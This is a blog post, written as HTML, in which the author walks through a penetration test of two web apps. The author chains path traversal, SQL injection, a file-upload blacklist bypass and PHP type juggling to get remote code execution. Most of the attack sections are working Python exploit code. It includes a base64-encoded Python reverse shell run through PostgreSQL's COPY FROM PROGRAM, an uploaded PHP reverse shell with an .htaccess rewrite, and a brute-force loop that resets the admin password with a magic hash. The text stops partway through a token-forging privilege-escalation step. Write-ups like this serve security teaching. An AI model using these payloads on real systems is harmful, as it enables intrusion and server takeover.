<!DOCTYPE html>
<html lang="en-us">
  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />

    <meta http-equiv="cache-control" content="max-age=0" />
    <meta http-equiv="cache-control" content="no-cache" />
    <meta http-equiv="expires" content="0" />
    <meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT" />
    <meta http-equiv="pragma" content="no-cache" />

    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
    <link rel="manifest" href="/site.webmanifest">

    <meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff" />
    <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000000" />

    <meta name="description" content="sunday scaries: exploiting web apps">

    
        <title>sunday scaries: exploiting web apps | à¼§</title>
    

    
    <link rel="stylesheet" type="text/css" href="/style.min.50e5dce6bdbdda9c021bb01730b34c1639e90db55e0fd1ed0f37771832d1ce47.css" media="all">
  </head>

  <body>
        
        <nav>
          <ul class="menu">
            
                <li><a tabindex="-1" class="menu-link" href="/about/">about</a></li>
            
                <li><a tabindex="-1" class="menu-link" href="/cv/">cv</a></li>
            
                <li><a tabindex="-1" class="menu-link" href="/posts/">posts</a></li>
            
                <li><a tabindex="-1" class="menu-link" href="/photography/">photography</a></li>
            
          </ul>
        </nav>
        



<div id="single-header">
  <h1>
    sunday scaries: exploiting web apps
  </h1>
  <div id="single-meta">
    
    
        <span class="datesub">jan 29, 2024</span>
      

  </div>
</div>



<aside class="toc" id="tableOfContentContainer">
  <nav id="TableOfContents">
  <ul>
    <li><a href="#ren">Ren</a>
      <ul>
        <li><a href="#analyzing-download">analyzing <code>download</code></a></li>
        <li><a href="#injecting-a-crafted-path">injecting a crafted path</a></li>
        <li><a href="#sqli-adminuserscategoryid">SQLi: <code>/admin/users/category?id=</code></a></li>
        <li><a href="#reverse-shell-payload">reverse shell payload</a></li>
      </ul>
    </li>
    <li><a href="#stimpy">Stimpy</a>
      <ul>
        <li><a href="#bypassing-file-blacklists">bypassing file blacklists</a></li>
        <li><a href="#type-juggling">type juggling</a></li>
      </ul>
    </li>
    <li><a href="#privilege-escalation">privilege escalation</a>
      <ul>
        <li><a href="#exploit-ren">exploit: Ren</a></li>
        <li><a href="#exploit-stimpy">exploit: Stimpy</a></li>
      </ul>
    </li>
  </ul>
</nav>
</aside>


<main><p>during a recent penetration test, i encountered two linked web apps that i thought would be good case studies for a blog post. let&rsquo;s call them Ren + Stimpy.</p>
<p>Ren is a custom-built web app, designed to manage user interactions + content. users can upload/download content, manager user roles, and interact with the database in the backend.</p>
<p>Stimpy handles uploaded invoices and user accounts, dealing with a variety of file uploads.</p>
<p>as you&rsquo;ll see, i was able to chain together path traversal, SQL injection, arbitrary file uploads, and type juggling attacks to achieve RCE [Remote Code Execution], and how i assembled the full exploit script piece-by-piece.</p>
<h2 id="ren">Ren</h2>
<h3 id="analyzing-download">analyzing <code>download</code></h3>
<p>i began by analyzing the <strong>download</strong> functionality in Ren.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>@GetMapping({<span style="color:#f1fa8c">&#34;/download&#34;</span>})
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">public</span> ResponseEntity<span style="color:#ff79c6">&lt;</span><span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[]&gt;</span> <span style="color:#50fa7b">getImage</span>(@RequestParam(<span style="color:#f1fa8c">&#34;id&#34;</span>) String id) {
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">try</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[]</span> image <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">this</span>.<span style="color:#50fa7b">downloadService</span>.<span style="color:#50fa7b">getPDF</span>(id.<span style="color:#50fa7b">replace</span>(<span style="color:#f1fa8c">&#34;../&#34;</span>, <span style="color:#f1fa8c">&#34;&#34;</span>));
</span></span><span style="display:flex;"><span>        HttpHeaders headers <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> HttpHeaders();
</span></span><span style="display:flex;"><span>        headers.<span style="color:#50fa7b">add</span>(<span style="color:#f1fa8c">&#34;Content-Disposition&#34;</span>, <span style="color:#f1fa8c">&#34;attachment; filename=ren.pdf&#34;</span>);
</span></span><span style="display:flex;"><span>        headers.<span style="color:#50fa7b">add</span>(<span style="color:#f1fa8c">&#34;Cache-Control&#34;</span>, <span style="color:#f1fa8c">&#34;no-cache, no-store&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> ((BodyBuilder)ResponseEntity.<span style="color:#50fa7b">ok</span>().<span style="color:#50fa7b">headers</span>(headers)).<span style="color:#50fa7b">contentType</span>(MediaType.<span style="color:#50fa7b">APPLICATION_PDF</span>).<span style="color:#50fa7b">body</span>(image);
</span></span><span style="display:flex;"><span>    } <span style="color:#ff79c6">catch</span> (Exception var4) {
</span></span><span style="display:flex;"><span>        logger.<span style="color:#50fa7b">error</span>(var4.<span style="color:#50fa7b">getMessage</span>());
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> ResponseEntity.<span style="color:#50fa7b">notFound</span>().<span style="color:#50fa7b">build</span>();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>this function attempts to filter out path elements like <code>../</code>, but this can be bypassed. it filters out <code>../</code> from the <code>id</code> parameter, but it doesn&rsquo;t account for bypasses like <code>..././</code>, which can allow attackers to access files outside the intended directory.</p>
<h3 id="injecting-a-crafted-path">injecting a crafted path</h3>
<p>by injecting a crafted path (<code>..././</code>), i was able to retrieve the file <code>config/uuid</code>, that contained an encryption key used to secure tokens.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>uuid <span style="color:#ff79c6">=</span> session<span style="color:#ff79c6">.</span>get(target <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#39;/download?id=..././conf/uuid&#39;</span>)<span style="color:#ff79c6">.</span>text
</span></span></code></pre></div><h3 id="sqli-adminuserscategoryid">SQLi: <code>/admin/users/category?id=</code></h3>
<p>next, i analyzed the <strong>administrative</strong> functionality. there&rsquo;s a rather glaring SQL injection vulnerability in the <code>/admin/users/category?id=</code> parameter.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">public</span> List<span style="color:#ff79c6">&lt;</span>User<span style="color:#ff79c6">&gt;</span> <span style="color:#50fa7b">getUsersWithPostsInCategory</span>(String categoryId) <span style="color:#8be9fd;font-style:italic">throws</span> Exception {
</span></span><span style="display:flex;"><span>    String sql <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;SELECT u.id, u.username, &#39;***&#39; as password, u.isAdmin, u.isActive, u.email &#34;</span> <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#34;FROM users u LEFT OUTER JOIN stories s ON s.owner_id = u.id &#34;</span> <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#34;LEFT OUTER JOIN categories c ON s.category_id = c.id WHERE s.category_id = &#34;</span> <span style="color:#ff79c6">+</span> categoryId;
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">this</span>.<span style="color:#50fa7b">template</span>.<span style="color:#50fa7b">query</span>(sql, <span style="color:#ff79c6">new</span> UserRowMapper());
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h3 id="reverse-shell-payload">reverse shell payload</h3>
<p>this query dynamically inserts <code>categoryId</code> without any sanitization. using a stacked SQL query, i injected a reverse shell payload that would connect back to my machine, giving me full remote access to the server.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>b64payload <span style="color:#ff79c6">=</span> base64<span style="color:#ff79c6">.</span>b64encode(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">import socket, subprocess, os, pty;
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">s=socket.socket(socket.AF_INET, socket.SOCK_STREAM);
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">s.connect((&#34;</span><span style="color:#f1fa8c">{</span>IP<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;, 5555));
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">os.dup2(s.fileno(), 0);
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">os.dup2(s.fileno(), 1);
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">os.dup2(s.fileno(), 2);
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">pty.spawn(&#34;/bin/bash&#34;)
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#39;&#39;&#39;</span><span style="color:#ff79c6">.</span>encode(<span style="color:#f1fa8c">&#39;utf-8&#39;</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>session<span style="color:#ff79c6">.</span>get(target <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#34;/admin/users/category?id=1; COPY(SELECT convert_from(decode(&#39;&#34;</span> <span style="color:#ff79c6">+</span> b64payload<span style="color:#ff79c6">.</span>decode(<span style="color:#f1fa8c">&#39;utf-8&#39;</span>) <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#34;&#39;, &#39;base64&#39;), &#39;utf-8&#39;)) to &#39;/tmp/shell.py&#39;; DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM &#39;python3 /tmp/shell.py&#39;;&#34;</span>)
</span></span></code></pre></div><p><code>socket.socket()</code> creates a new network socket, and <code>s.connect()</code> makes the target connect to my IP address over port <code>5555</code>. <code>os.dup()</code> redirect the standard input, output, and error file descriptors (<code>0</code>, <code>1</code>, <code>2</code>) to the socket <code>s</code>. any command executed on the target will be sent back to me via the socket.</p>
<p><code>pty.spawn()</code> spawns a bash shell, which gives me an interactive command-line session on the target. encoding everything in base64 just means i can transmit binary/special characters as plaintext.</p>
<p>the target URL <code>/admin/users/category?id=1</code> is vulnerable to SQL injection via stacked queries. this means i can append + execute additional SQL commands after the legitimate query.</p>
<p>the base64-encoded payload is injected into the SQL query via <code>id</code>, after which the query decodes the payload back to the original Python code, and writes the decoded payload to a temporary file <code>/tmp/shell.py</code> on the server, using <code>COPY</code> (PostgreSQL).</p>
<p>once the payload is in <code>/tmp/shell.py</code>, the SQL injection creates + runs the reverse shell by executing <code>COPY cmd_exec FROM PROGRAM 'python3 /tmp/shell.py'</code>. this allows the execution of external programs, running the shell script on the target. the commands <code>DROP TABLE IF EXISTS cmd_exec</code> and <code>CREATE TABLE cmd_exec</code> are just regular commands used to create temporary tables. i included them just to make the query structure valid in PostgreSQL.</p>
<h2 id="stimpy">Stimpy</h2>
<h3 id="bypassing-file-blacklists">bypassing file blacklists</h3>
<p>now that Ren&rsquo;s fully compromised, i turned my attention to Stimpy. the first vulnerability i found was in the <strong>file upload</strong> functionality.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff79c6">public</span> <span style="color:#ff79c6">function</span> <span style="color:#50fa7b">importInvoices</span>(<span style="color:#8be9fd;font-style:italic">$request</span>, <span style="color:#8be9fd;font-style:italic">$response</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">$user</span> <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">$this</span><span style="color:#ff79c6">-&gt;</span><span style="color:#50fa7b">container</span>[<span style="color:#f1fa8c">&#39;auth&#39;</span>]<span style="color:#ff79c6">-&gt;</span><span style="color:#50fa7b">user</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">$directory</span> <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">$this</span><span style="color:#ff79c6">-&gt;</span><span style="color:#50fa7b">container</span><span style="color:#ff79c6">-&gt;</span><span style="color:#50fa7b">settings</span>[<span style="color:#f1fa8c">&#39;importDirectory&#39;</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">$uploadedFiles</span> <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">$request</span><span style="color:#ff79c6">-&gt;</span><span style="color:#50fa7b">getUploadedFiles</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">$uploadedFile</span> <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">$uploadedFiles</span>[<span style="color:#f1fa8c">&#39;file&#39;</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> (<span style="color:#8be9fd;font-style:italic">$uploadedFile</span><span style="color:#ff79c6">-&gt;</span><span style="color:#50fa7b">getError</span>() <span style="color:#ff79c6">===</span> UPLOAD_ERR_OK) {
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">$filename</span> <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">$uploadedFile</span><span style="color:#ff79c6">-&gt;</span><span style="color:#50fa7b">getClientFilename</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">$f_validation</span> <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">$this</span><span style="color:#ff79c6">-&gt;</span><span style="color:#50fa7b">container</span><span style="color:#ff79c6">-&gt;</span><span style="color:#50fa7b">validator</span><span style="color:#ff79c6">-&gt;</span><span style="color:#50fa7b">validate</span>([
</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#34;filename&#34;</span> <span style="color:#ff79c6">=&gt;</span> <span style="color:#8be9fd;font-style:italic">$filename</span>
</span></span><span style="display:flex;"><span>        ], [
</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#39;filename&#39;</span> <span style="color:#ff79c6">=&gt;</span> v<span style="color:#ff79c6">::</span><span style="color:#50fa7b">alnum</span>(<span style="color:#f1fa8c">&#39;.&#39;</span>)
</span></span><span style="display:flex;"><span>        ]);
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> (<span style="color:#8be9fd;font-style:italic">$f_validation</span><span style="color:#ff79c6">-&gt;</span><span style="color:#50fa7b">failed</span>()) {
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">return</span> <span style="color:#8be9fd;font-style:italic">$this</span><span style="color:#ff79c6">-&gt;</span><span style="color:#50fa7b">container</span><span style="color:#ff79c6">-&gt;</span><span style="color:#50fa7b">helper</span><span style="color:#ff79c6">-&gt;</span><span style="color:#50fa7b">error</span>(<span style="color:#8be9fd;font-style:italic">$f_validation</span><span style="color:#ff79c6">-&gt;</span><span style="color:#50fa7b">errors</span>, <span style="color:#8be9fd;font-style:italic">$response</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> (in_array(pathinfo(<span style="color:#8be9fd;font-style:italic">$filename</span>, PATHINFO_EXTENSION), <span style="color:#8be9fd;font-style:italic">$this</span><span style="color:#ff79c6">-&gt;</span><span style="color:#50fa7b">container</span><span style="color:#ff79c6">-&gt;</span><span style="color:#50fa7b">settings</span>[<span style="color:#f1fa8c">&#39;restrictedExt&#39;</span>])) {
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">return</span> <span style="color:#8be9fd;font-style:italic">$this</span><span style="color:#ff79c6">-&gt;</span><span style="color:#50fa7b">container</span><span style="color:#ff79c6">-&gt;</span><span style="color:#50fa7b">helper</span><span style="color:#ff79c6">-&gt;</span><span style="color:#50fa7b">error</span>([<span style="color:#f1fa8c">&#34;Invalid Extension&#34;</span> <span style="color:#ff79c6">=&gt;</span> [<span style="color:#f1fa8c">&#34;Extension is not allowed&#34;</span>]], <span style="color:#8be9fd;font-style:italic">$response</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>it attempts to block dangerous file extensions using a blacklist: <code>restrictedExt</code>.</p>
<p>however, the list isn&rsquo;t exhaustive.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f1fa8c">&#39;restrictedExt&#39;</span> <span style="color:#ff79c6">=&gt;</span> [<span style="color:#f1fa8c">&#39;php&#39;</span>, <span style="color:#f1fa8c">&#39;php2&#39;</span>, <span style="color:#f1fa8c">&#39;php3&#39;</span>, <span style="color:#f1fa8c">&#39;php4&#39;</span>, <span style="color:#f1fa8c">&#39;php5&#39;</span>, <span style="color:#f1fa8c">&#39;phtml&#39;</span>, <span style="color:#f1fa8c">&#39;exe&#39;</span>, <span style="color:#f1fa8c">&#39;asp&#39;</span>, <span style="color:#f1fa8c">&#39;cgi&#39;</span>, <span style="color:#f1fa8c">&#39;vbs&#39;</span>, <span style="color:#f1fa8c">&#39;pl&#39;</span>, <span style="color:#f1fa8c">&#39;com&#39;</span>]
</span></span></code></pre></div><p>exploiting this is a three-part process. first, i have to upload the <code>.htaccess</code> file. this file contains <strong>Apache rewrite rules</strong> that allow execution of files with a <code>.php6</code> extension. this will bypass the restricted file extensions.</p>
<p>next, i&rsquo;ll have to upload a PHP reverse shell <code>shell.php6</code>. like the shell in Ren, this will connect back to my machine on a specified IP and port.</p>
<p>finally, i&rsquo;ll have to execute. this will be done by sending a <code>GET</code> request to the uploaded shell script <code>/imports/shell.php</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#6272a4"># upload .htaccess file to enable execution of PHP files with unusual extensions</span>
</span></span><span style="display:flex;"><span>session<span style="color:#ff79c6">.</span>post(target <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#39;/import&#39;</span>, files<span style="color:#ff79c6">=</span>{<span style="color:#f1fa8c">&#39;file&#39;</span>: (<span style="color:#f1fa8c">&#39;.htaccess&#39;</span>, <span style="color:#f1fa8c">&#39;RewriteEngine on</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">RewriteRule shell.php shell.php6&#39;</span>)})
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># upload reverse shell in PHP</span>
</span></span><span style="display:flex;"><span>session<span style="color:#ff79c6">.</span>post(target <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#39;/import&#39;</span>, files<span style="color:#ff79c6">=</span>{<span style="color:#f1fa8c">&#39;file&#39;</span>: (<span style="color:#f1fa8c">&#39;shell.php6&#39;</span>, <span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#39;&lt;?php $s=fsockopen(&#34;</span><span style="color:#f1fa8c">{</span>my_ip<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;,4444); $p=proc_open(&#34;/bin/sh -i&#34;, array(0=&gt;$s, 1=&gt;$s, 2=&gt;$s), $pipes); ?&gt;&#39;</span>)})
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># execute the uploaded reverse shell</span>
</span></span><span style="display:flex;"><span>session<span style="color:#ff79c6">.</span>get(target <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#39;/imports/shell.php&#39;</span>)
</span></span></code></pre></div><h3 id="type-juggling">type juggling</h3>
<p>now that i&rsquo;ve abused the lax file extension restrictions, i can move on to the next vulnerability. i noticed a flaw in the password reset mechanism: <strong>type juggling</strong>. this allows an attacker to bypass the password reset token check and reset the administrator&rsquo;s password.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff79c6">public</span> <span style="color:#ff79c6">function</span> <span style="color:#50fa7b">checkResetLink</span>(<span style="color:#8be9fd;font-style:italic">$userId</span>, <span style="color:#8be9fd;font-style:italic">$time</span>, <span style="color:#8be9fd;font-style:italic">$sig</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">$user</span> <span style="color:#ff79c6">=</span> User<span style="color:#ff79c6">::</span><span style="color:#50fa7b">find</span>(<span style="color:#8be9fd;font-style:italic">$userId</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">empty</span>(<span style="color:#8be9fd;font-style:italic">$user</span><span style="color:#ff79c6">-&gt;</span><span style="color:#50fa7b">resetToken</span>)) {
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">false</span>;
</span></span><span style="display:flex;"><span>    } <span style="color:#ff79c6">else</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> <span style="color:#8be9fd;font-style:italic">$this</span><span style="color:#ff79c6">-&gt;</span><span style="color:#50fa7b">generateSig</span>(<span style="color:#8be9fd;font-style:italic">$user</span><span style="color:#ff79c6">-&gt;</span><span style="color:#50fa7b">id</span>, <span style="color:#8be9fd;font-style:italic">$user</span><span style="color:#ff79c6">-&gt;</span><span style="color:#50fa7b">resetToken</span>, <span style="color:#8be9fd;font-style:italic">$time</span>, <span style="color:#8be9fd;font-style:italic">$user</span><span style="color:#ff79c6">-&gt;</span><span style="color:#50fa7b">password</span>) <span style="color:#ff79c6">==</span> <span style="color:#8be9fd;font-style:italic">$sig</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">public</span> <span style="color:#ff79c6">function</span> <span style="color:#50fa7b">generateSig</span>(<span style="color:#8be9fd;font-style:italic">$id</span>, <span style="color:#8be9fd;font-style:italic">$resetToken</span>, <span style="color:#8be9fd;font-style:italic">$time</span>, <span style="color:#8be9fd;font-style:italic">$password</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> substr(hash(<span style="color:#f1fa8c">&#34;sha256&#34;</span>, <span style="color:#8be9fd;font-style:italic">$id</span> <span style="color:#ff79c6">.</span> <span style="color:#f1fa8c">&#34;|&#34;</span> <span style="color:#ff79c6">.</span> <span style="color:#8be9fd;font-style:italic">$resetToken</span> <span style="color:#ff79c6">.</span> <span style="color:#f1fa8c">&#34;|&#34;</span> <span style="color:#ff79c6">.</span> <span style="color:#8be9fd;font-style:italic">$time</span> <span style="color:#ff79c6">.</span> <span style="color:#f1fa8c">&#34;|&#34;</span> <span style="color:#ff79c6">.</span> <span style="color:#8be9fd;font-style:italic">$password</span>), <span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">8</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>the reset token is being compared using a weak comparison operator <code>==</code>. weak comparison can treat two values as equal if they evaluate to the same number, even when they&rsquo;re strings. hence, i can &ldquo;force&rdquo; a comparison to return true by using a <strong>magic hash</strong>. for example, the string <code>0e123456</code> is considered <code>0</code> when evaluated as a number. if the reset token on the server is also weakly compared and happens to be evaluated as <code>0</code>, i can bypass the token check!</p>
<p>i created two functions for the exploit: <code>ResetLink()</code> and <code>Test()</code>. <code>ResetLink()</code> sends a password reset request to the server using the <code>forgot password</code> endpoint. it submits the admin email to initiate the reset process.</p>
<p><code>Test()</code> checks if the server accepts the password reset link by making a <code>GET</code> request to a URL crafted with a <strong>timestamp</strong> <code>ts</code> and the <strong>magic hash</strong> <code>0e123456</code>. hopefully, it will be interpreted as scientific notation and lead to a false positive.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">ResetLink</span>():
</span></span><span style="display:flex;"><span>    session<span style="color:#ff79c6">.</span>post(target <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#39;/forgot&#39;</span>, data<span style="color:#ff79c6">=</span>{<span style="color:#f1fa8c">&#39;email&#39;</span>: email})
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">Test</span>():
</span></span><span style="display:flex;"><span>    resp <span style="color:#ff79c6">=</span> session<span style="color:#ff79c6">.</span>get(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#39;</span><span style="color:#f1fa8c">{</span>target<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">/reset/1/</span><span style="color:#f1fa8c">{</span>ts<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">/0e123456&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> <span style="color:#f1fa8c">&#34;Reset your password below&#34;</span> <span style="color:#ff79c6">in</span> resp<span style="color:#ff79c6">.</span>text:
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">True</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">else</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">False</span>
</span></span></code></pre></div><p>all i need to do now is to repeatedly request a password reset link using the admin&rsquo;s email. the <code>Test()</code> function will check if the <strong>magic hash</strong> URL is accepted, and, if so, a new password will be submitted, along with a confirmation of success.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">while</span> <span style="color:#ff79c6">True</span>:
</span></span><span style="display:flex;"><span>    ResetLink()
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> Test():
</span></span><span style="display:flex;"><span>        session<span style="color:#ff79c6">.</span>post(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#39;</span><span style="color:#f1fa8c">{</span>target<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">/reset/1/</span><span style="color:#f1fa8c">{</span>ts<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">/0e123456&#39;</span>, data<span style="color:#ff79c6">=</span>{<span style="color:#f1fa8c">&#39;password&#39;</span>:password})
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#39;hell yeah brother!&#39;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">break</span>
</span></span></code></pre></div><h2 id="privilege-escalation">privilege escalation</h2>
<p>the final step is <strong>privilege escalation</strong>. recall the <strong>path traversal</strong> exploit that allowed me to retrieve the <code>config/uuid</code> file. the UUID is a critical piece because it&rsquo;s the key to decrypting/encrypting session tokens. let&rsquo;s take a look at the <code>Tokenizer.java</code> class that i&rsquo;ll exploit.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">class</span> <span style="color:#50fa7b">Tokenizer</span> {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">static</span> String <span style="color:#50fa7b">decryptToken</span>(String user, String token, String uuid) {
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">try</span> {
</span></span><span style="display:flex;"><span>            SecretKey key <span style="color:#ff79c6">=</span> getKeyForUser(user, uuid);
</span></span><span style="display:flex;"><span>            Cipher cipher <span style="color:#ff79c6">=</span> Cipher.<span style="color:#50fa7b">getInstance</span>(<span style="color:#f1fa8c">&#34;DESede/ECB/PKCS5Padding&#34;</span>);
</span></span><span style="display:flex;"><span>            cipher.<span style="color:#50fa7b">init</span>(Cipher.<span style="color:#50fa7b">DECRYPT_MODE</span>, key);
</span></span><span style="display:flex;"><span>            <span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[]</span> enc <span style="color:#ff79c6">=</span> Base64.<span style="color:#50fa7b">getUrlDecoder</span>().<span style="color:#50fa7b">decode</span>(token.<span style="color:#50fa7b">getBytes</span>(<span style="color:#f1fa8c">&#34;UTF-8&#34;</span>));
</span></span><span style="display:flex;"><span>            <span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[]</span> plain <span style="color:#ff79c6">=</span> cipher.<span style="color:#50fa7b">doFinal</span>(enc);
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">new</span> String(plain, <span style="color:#f1fa8c">&#34;UTF-8&#34;</span>);
